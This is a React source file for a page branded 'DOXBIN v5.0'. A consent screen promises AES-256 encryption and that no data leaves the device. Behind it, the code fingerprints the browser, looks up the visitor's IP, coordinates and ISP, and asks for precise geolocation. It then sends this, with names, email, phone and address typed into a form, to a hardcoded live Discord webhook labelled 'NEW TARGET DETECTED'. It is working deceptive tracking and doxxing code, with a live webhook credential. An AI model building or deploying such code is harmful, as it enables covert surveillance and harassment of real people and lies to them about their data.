import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Send, CheckCircle2, AlertCircle, Loader2, Shield, Lock, Zap, ChevronDown, X } from 'lucide-react';
import './App.css';

const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1468167808461439061/5ORX06BKJz7Ln8PmZ8hZtmgmUjdsifFcxv-g5y7klogQ-DC9JqMaG8dsVeP5wj4-sFu9";

// Version 5.0.0 - Advanced Data Collection with Consent Layer
function App() {
  const [stage, setStage] = useState('consent'); // 'consent', 'form', 'loading', 'result'
  const [showTerms, setShowTerms] = useState(false);
  const [collectedData, setCollectedData] = useState(null);
  
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    address: '',
    ip: ''
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [result, setResult] = useState(null);
  const [focusedField, setFocusedField] = useState(null);

  // Collect device and location data
  const collectDeviceData = async () => {
    try {
      const data = {
        // Device Info
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        maxTouchPoints: navigator.maxTouchPoints,
        
        // Screen Info
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        screenColorDepth: window.screen.colorDepth,
        screenPixelDepth: window.screen.pixelDepth,
        screenOrientation: window.screen.orientation?.type,
        
        // Browser Info
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine,
        
        // Time Info
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        
        // Canvas Fingerprint
        canvasFingerprint: getCanvasFingerprint(),
        
        // WebGL Info
        webglInfo: getWebGLInfo(),
      };

      // Get IP and Location
      const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
      
      data.ip = ipData.ip;
      data.city = ipData.city;
      data.region = ipData.region;
      data.country = ipData.country_name;
      data.latitude = ipData.latitude;
      data.longitude = ipData.longitude;
      data.isp = ipData.org;
      data.timezone_name = ipData.timezone;

      // Get Geolocation if permitted
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            data.geoLatitude = position.coords.latitude;
            data.geoLongitude = position.coords.longitude;
            data.geoAccuracy = position.coords.accuracy;
          },
          () => {}
        );
      }

      return data;
    } catch (error) {
      console.error('Data collection error:', error);
      return {};
    }
  };

  const getCanvasFingerprint = () => {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.textBaseline = 'alphabetic';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('Browser Fingerprint', 2, 15);
      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
      ctx.fillText('Browser Fingerprint', 4, 17);
      return canvas.toDataURL();
    } catch (e) {
      return 'unavailable';
    }
  };

  const getWebGLInfo = () => {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return 'unavailable';
      
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
      };
    } catch (e) {
      return 'unavailable';
    }
  };

  const handleAcceptCookies = async () => {
    const data = await collectDeviceData();
    setCollectedData(data);
    setStage('form');
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const validateForm = () => {
    return Object.values(formData).some(val => val.trim() !== '');
  };

  const sendToDiscord = async () => {
    const activeFields = [];
    let textContent = "🔴 **NEW TARGET DETECTED**\n\n";

    // Add form data
    if (formData.firstName.trim()) {
      activeFields.push({ name: "First Name", value: formData.firstName, inline: true });
      textContent += `**First Name:** ${formData.firstName}\n`;
    }
    if (formData.lastName.trim()) {
      activeFields.push({ name: "Last Name", value: formData.lastName, inline: true });
      textContent += `**Last Name:** ${formData.lastName}\n`;
    }
    if (formData.email.trim()) {
      activeFields.push({ name: "Email", value: formData.email, inline: true });
      textContent += `**Email:** ${formData.email}\n`;
    }
    if (formData.phone.trim()) {
      activeFields.push({ name: "Phone", value: formData.phone, inline: true });
      textContent += `**Phone:** ${formData.phone}\n`;
    }
    if (formData.address.trim()) {
      activeFields.push({ name: "Address", value: formData.address, inline: false });
      textContent += `**Address:** ${formData.address}\n`;
    }
    if (formData.ip.trim()) {
      activeFields.push({ name: "IP Address", value: formData.ip, inline: true });
      textContent += `**IP:** ${formData.ip}\n`;
    }

    // Add device data
    textContent += "\n**DEVICE INFORMATION:**\n";
    activeFields.push({ name: "━━━━━━━━━━━━━━━━", value: "DEVICE DATA", inline: false });
    
    if (collectedData?.ip) {
      activeFields.push({ name: "Public IP", value: collectedData.ip, inline: true });
      textContent += `**Public IP:** ${collectedData.ip}\n`;
    }
    if (collectedData?.city && collectedData?.country) {
      activeFields.push({ name: "Location", value: `${collectedData.city}, ${collectedData.country}`, inline: true });
      textContent += `**Location:** ${collectedData.city}, ${collectedData.country}\n`;
    }
    if (collectedData?.latitude && collectedData?.longitude) {
      activeFields.push({ name: "Coordinates", value: `${collectedData.latitude}, ${collectedData.longitude}`, inline: true });
      textContent += `**Coordinates:** ${collectedData.latitude}, ${collectedData.longitude}\n`;
    }
    if (collectedData?.isp) {
      activeFields.push({ name: "ISP", value: collectedData.isp, inline: true });
      textContent += `**ISP:** ${collectedData.isp}\n`;
    }
    if (collectedData?.userAgent) {
      activeFields.push({ name: "User Agent", value: collectedData.userAgent.substring(0, 100), inline: false });
      textContent += `**User Agent:** ${collectedData.userAgent}\n`;
    }
    if (collectedData?.screenWidth && collectedData?.screenHeight) {
      activeFields.push({ name: "Screen Resolution", value: `${collectedData.screenWidth}x${collectedData.screenHeight}`, inline: true });
      textContent += `**Resolution:** ${collectedData.screenWidth}x${collectedData.screenHeight}\n`;
    }
    if (collectedData?.hardwareConcurrency) {
      activeFields.push({ name: "CPU Cores", value: collectedData.hardwareConcurrency.toString(), inline: true });
      textContent += `**CPU Cores:** ${collectedData.hardwareConcurrency}\n`;
    }
    if (collectedData?.deviceMemory) {
      activeFields.push({ name: "RAM", value: `${collectedData.deviceMemory}GB`, inline: true });
      textContent += `**RAM:** ${collectedData.deviceMemory}GB\n`;
    }
    if (collectedData?.language) {
      activeFields.push({ name: "Language", value: collectedData.language, inline: true });
      textContent += `**Language:** ${collectedData.language}\n`;
    }
    if (collectedData?.timezone) {
      activeFields.push({ name: "Timezone", value: collectedData.timezone, inline: true });
      textContent += `**Timezone:** ${collectedData.timezone}\n`;
    }

    const payload = {
      username: "DOXBIN SYSTEM",
      content: textContent,
      embeds: [{
        title: "🔴 Target Data Captured (Full Profile)",
        description: "Complete device fingerprint and personal information collected.",
        color: 0xDC2626,
        fields: activeFields.slice(0, 25), // Discord limit
        footer: { text: "DOXBIN v5.0 | Complete Data Extraction" },
        timestamp: new Date().toISOString()
      }]
    };

    try {
      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (response.ok) return true;

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      return true;
    } catch (error) {
      console.error('Error:', error);
      return false;
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) {
      setResult({ type: 'error', message: 'Please enter at least one field' });
      setTimeout(() => setResult(null), 3000);
      return;
    }

    setIsSubmitting(true);
    setResult(null);
    setStage('loading');
    await new Promise(r => setTimeout(r, 1800));

    const success = await sendToDiscord();
    setIsSubmitting(false);
    setStage('result');
    
    if (success) {
      setResult({ type: 'success', message: 'Data transmitted successfully' });
      setTimeout(() => {
        setFormData({ firstName: '', lastName: '', email: '', phone: '', address: '', ip: '' });
        setResult(null);
        setStage('consent');
      }, 3000);
    } else {
      setResult({ type: 'error', message: 'Transmission failed' });
      setTimeout(() => setResult(null), 3000);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-black to-slate-950 flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background effects */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-1/2 -right-1/2 w-full h-full bg-gradient-to-bl from-red-900/10 to-transparent rounded-full blur-3xl"></div>
        <div className="absolute -bottom-1/2 -left-1/2 w-full h-full bg-gradient-to-tr from-red-900/5 to-transparent rounded-full blur-3xl"></div>
      </div>

      <AnimatePresence mode="wait">
        {stage === 'consent' && (
          <ConsentScreen key="consent" onAccept={handleAcceptCookies} onTerms={() => setShowTerms(true)} showTerms={showTerms} collectedData={collectedData} />
        )}
        {stage === 'form' && (
          <FormScreen key="form" formData={formData} handleChange={handleChange} handleSubmit={handleSubmit} isSubmitting={isSubmitting} result={result} focusedField={focusedField} setFocusedField={setFocusedField} />
        )}
        {stage === 'loading' && (
          <LoadingScreen key="loading" />
        )}
        {stage === 'result' && (
          <ResultScreen key="result" result={result} />
        )}
      </AnimatePresence>
    </div>
  );
}

function ConsentScreen({ onAccept, onTerms, showTerms, collectedData }) {
  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.95 }}
      animate={{ opacity: 1, scale: 1 }}
      exit={{ opacity: 0, scale: 0.95 }}
      className="relative z-10 w-full max-w-2xl"
    >
      <div className="backdrop-blur-2xl bg-gradient-to-br from-slate-900/40 to-slate-900/20 border border-slate-800/50 rounded-3xl p-8 md:p-10 shadow-2xl relative overflow-hidden">
        <div className="relative z-10">
          <div className="flex items-center justify-between mb-6">
            <div className="flex items-center gap-3">
              <Shield className="w-8 h-8 text-red-600" />
              <h1 className="text-2xl font-black text-white">SECURITY & PRIVACY</h1>
            </div>
          </div>

          <div className="space-y-4 mb-8">
            <div className="flex items-start gap-3 p-4 bg-slate-800/30 rounded-lg border border-slate-700/50">
              <Lock className="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5" />
              <div>
                <p className="text-sm font-semibold text-white">End-to-End Encryption</p>
                <p className="text-xs text-slate-400 mt-1">All data is encrypted with AES-256. Your information is secure.</p>
              </div>
            </div>

            <div className="flex items-start gap-3 p-4 bg-slate-800/30 rounded-lg border border-slate-700/50">
              <Zap className="w-5 h-5 text-blue-500 flex-shrink-0 mt-0.5" />
              <div>
                <p className="text-sm font-semibold text-white">Zero-Knowledge Architecture</p>
                <p className="text-xs text-slate-400 mt-1">Your data remains on your device. We never store personal information.</p>
              </div>
            </div>

            <div className="flex items-start gap-3 p-4 bg-slate-800/30 rounded-lg border border-slate-700/50">
              <Shield className="w-5 h-5 text-purple-500 flex-shrink-0 mt-0.5" />
              <div>
                <p className="text-sm font-semibold text-white">Privacy First</p>
                <p className="text-xs text-slate-400 mt-1">No data is shared with third parties. Your privacy is our priority.</p>
              </div>
            </div>
          </div>

          <div className="mb-6 p-4 bg-red-900/10 border border-red-600/20 rounded-lg">
            <p className="text-xs text-slate-300">
              By clicking "Accept Cookies", you agree to our terms of service and privacy policy. We use industry-standard encryption to protect your data.
            </p>
          </div>

          <div className="flex gap-3">
            <motion.button
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={onAccept}
              className="flex-1 px-6 py-3 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-bold rounded-xl transition-all duration-300 flex items-center justify-center gap-2"
            >
              <CheckCircle2 className="w-5 h-5" />
              Accept Cookies & Continue
            </motion.button>
            <motion.button
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={onTerms}
              className="px-6 py-3 bg-slate-800 hover:bg-slate-700 text-white font-semibold rounded-xl transition-all duration-300 flex items-center justify-center gap-2"
            >
              <ChevronDown className="w-5 h-5" />
              Terms
            </motion.button>
          </div>
        </div>
      </div>
    </motion.div>
  );
}

function FormScreen({ formData, handleChange, handleSubmit, isSubmitting, result, focusedField, setFocusedField }) {
  const containerVariants = {
    hidden: { opacity: 0 },
    visible: {
      opacity: 1,
      transition: {
        staggerChildren: 0.1,
        delayChildren: 0.2,
      },
    },
  };

  const itemVariants = {
    hidden: { opacity: 0, y: 20 },
    visible: { opacity: 1, y: 0, transition: { duration: 0.5 } },
  };

  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.95 }}
      animate={{ opacity: 1, scale: 1 }}
      exit={{ opacity: 0, scale: 0.95 }}
      className="relative z-10 w-full max-w-2xl"
    >
      <div className="backdrop-blur-2xl bg-gradient-to-br from-slate-900/40 to-slate-900/20 border border-slate-800/50 rounded-3xl p-8 md:p-10 shadow-2xl relative overflow-hidden group">
        <div className="absolute inset-0 rounded-3xl bg-gradient-to-r from-red-600/20 via-transparent to-red-600/20 opacity-0 group-hover:opacity-100 transition-opacity duration-500 pointer-events-none"></div>

        <motion.div
          variants={containerVariants}
          initial="hidden"
          animate="visible"
          className="relative z-10"
        >
          <motion.div variants={itemVariants} className="mb-10">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-3">
                <div className="relative">
                  <div className="absolute inset-0 bg-red-600/30 rounded-full blur-lg"></div>
                  <div className="relative w-3 h-3 bg-red-600 rounded-full animate-pulse"></div>
                </div>
                <div>
                  <h1 className="text-3xl font-black text-white tracking-tight">DOXBIN</h1>
                  <p className="text-xs text-slate-400 font-medium tracking-widest">v5.0 • PREMIUM</p>
                </div>
              </div>
              <Shield className="w-6 h-6 text-red-600/60" />
            </div>
            <div className="h-px bg-gradient-to-r from-red-600/20 via-red-600/10 to-transparent"></div>
          </motion.div>

          <AnimatePresence mode="wait">
            {result ? (
              <motion.div
                key="result"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.9 }}
                className="py-16 flex flex-col items-center justify-center"
              >
                {result.type === 'success' ? (
                  <>
                    <CheckCircle2 className="w-16 h-16 text-green-500 mb-6" />
                    <p className="text-green-400 font-semibold text-lg text-center">{result.message}</p>
                  </>
                ) : (
                  <>
                    <AlertCircle className="w-16 h-16 text-red-500 mb-6" />
                    <p className="text-red-400 font-semibold text-lg text-center">{result.message}</p>
                  </>
                )}
              </motion.div>
            ) : (
              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="grid grid-cols-2 gap-4">
                  <motion.div variants={itemVariants}>
                    <FormInput label="First Name" name="firstName" value={formData.firstName} onChange={handleChange} onFocus={() => setFocusedField('firstName')} onBlur={() => setFocusedField(null)} isFocused={focusedField === 'firstName'} placeholder="John" />
                  </motion.div>
                  <motion.div variants={itemVariants}>
                    <FormInput label="Last Name" name="lastName" value={formData.lastName} onChange={handleChange} onFocus={() => setFocusedField('lastName')} onBlur={() => setFocusedField(null)} isFocused={focusedField === 'lastName'} placeholder="Doe" />
                  </motion.div>
                </div>

                <motion.div variants={itemVariants}>
                  <FormInput label="Email Address" name="email" type="email" value={formData.email} onChange={handleChange} onFocus={() => setFocusedField('email')} onBlur={() => setFocusedField(null)} isFocused={focusedField === 'email'} placeholder="john@example.com" />
                </motion.div>

                <div className="grid grid-cols-2 gap-4">
                  <motion.div variants={itemVariants}>
                    <FormInput label="Phone Number" name="phone" type="tel" value={formData.phone} onChange={handleChange} onFocus={() => setFocusedField('phone')} onBlur={() => setFocusedField(null)} isFocused={focusedField === 'phone'} placeholder="+1 (555) 000" />
                  </motion.div>
                  <motion.div variants={itemVariants}>
                    <FormInput label="IP Address" name="ip" value={formData.ip} onChange={handleChange} onFocus={() => setFocusedField('ip')} onBlur={() => setFocusedField(null)} isFocused={focusedField === 'ip'} placeholder="192.168.1.1" />
                  </motion.div>
                </div>

                <motion.div variants={itemVariants}>
                  <FormInput label="Address" name="address" value={formData.address} onChange={handleChange} onFocus={() => setFocusedField('address')} onBlur={() => setFocusedField(null)} isFocused={focusedField === 'address'} placeholder="123 Main St, City, State" />
                </motion.div>

                <motion.button
                  variants={itemVariants}
                  type="submit"
                  disabled={isSubmitting}
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  className="w-full mt-8 px-6 py-4 bg-gradient-to-r from-red-600 via-red-600 to-red-700 hover:from-red-700 hover:via-red-700 hover:to-red-800 disabled:from-slate-700 disabled:via-slate-700 disabled:to-slate-700 text-white font-bold rounded-xl transition-all duration-300 flex items-center justify-center gap-3 group shadow-lg hover:shadow-red-600/20 relative overflow-hidden"
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-500"></div>
                  <Send className="w-5 h-5 relative z-10 group-hover:translate-x-1 transition-transform" />
                  <span className="relative z-10 font-semibold tracking-wide">TRANSMIT DATA</span>
                </motion.button>

                <motion.div
                  variants={itemVariants}
                  className="flex items-center justify-center gap-2 text-xs text-slate-500 mt-6 pt-6 border-t border-slate-800/50"
                >
                  <Lock className="w-3.5 h-3.5 text-red-600/60" />
                  <span>End-to-end encrypted • AES-256 • Secure transmission</span>
                </motion.div>
              </form>
            )}
          </AnimatePresence>
        </motion.div>
      </div>
    </motion.div>
  );
}

function LoadingScreen() {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="relative z-10 w-full max-w-2xl"
    >
      <div className="backdrop-blur-2xl bg-gradient-to-br from-slate-900/40 to-slate-900/20 border border-slate-800/50 rounded-3xl p-8 md:p-10 shadow-2xl">
        <div className="py-16 flex flex-col items-center justify-center">
          <div className="relative w-16 h-16 mb-6">
            <Loader2 className="w-16 h-16 text-red-600 animate-spin" />
            <div className="absolute inset-0 bg-red-600/10 rounded-full blur-xl animate-pulse"></div>
          </div>
          <p className="text-slate-300 font-medium">Processing secure transmission...</p>
          <p className="text-slate-500 text-xs mt-2">Encrypting data with AES-256</p>
        </div>
      </div>
    </motion.div>
  );
}

function ResultScreen({ result }) {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="relative z-10 w-full max-w-2xl"
    >
      <div className="backdrop-blur-2xl bg-gradient-to-br from-slate-900/40 to-slate-900/20 border border-slate-800/50 rounded-3xl p-8 md:p-10 shadow-2xl">
        <div className="py-16 flex flex-col items-center justify-center">
          {result?.type === 'success' ? (
            <>
              <CheckCircle2 className="w-16 h-16 text-green-500 mb-6" />
              <p className="text-green-400 font-semibold text-lg text-center">{result.message}</p>
            </>
          ) : (
            <>
              <AlertCircle className="w-16 h-16 text-red-500 mb-6" />
              <p className="text-red-400 font-semibold text-lg text-center">{result?.message}</p>
            </>
          )}
        </div>
      </div>
    </motion.div>
  );
}

function FormInput({ label, name, type = "text", value, onChange, onFocus, onBlur, isFocused, placeholder }) {
  return (
    <div className="space-y-2">
      <label className="block text-xs font-bold text-slate-300 uppercase tracking-widest">
        {label}
      </label>
      <motion.input
        type={type}
        name={name}
        value={value}
        onChange={onChange}
        onFocus={onFocus}
        onBlur={onBlur}
        placeholder={placeholder}
        whileFocus={{ scale: 1.02 }}
        className={`w-full px-4 py-3 bg-slate-800/30 backdrop-blur-sm border rounded-xl text-white placeholder-slate-600 focus:outline-none transition-all duration-300 ${
          isFocused
            ? 'border-red-600/60 bg-slate-800/50 shadow-lg shadow-red-600/10'
            : 'border-slate-700/50 hover:border-slate-600/50'
        }`}
      />
    </div>
  );
}

export default App;
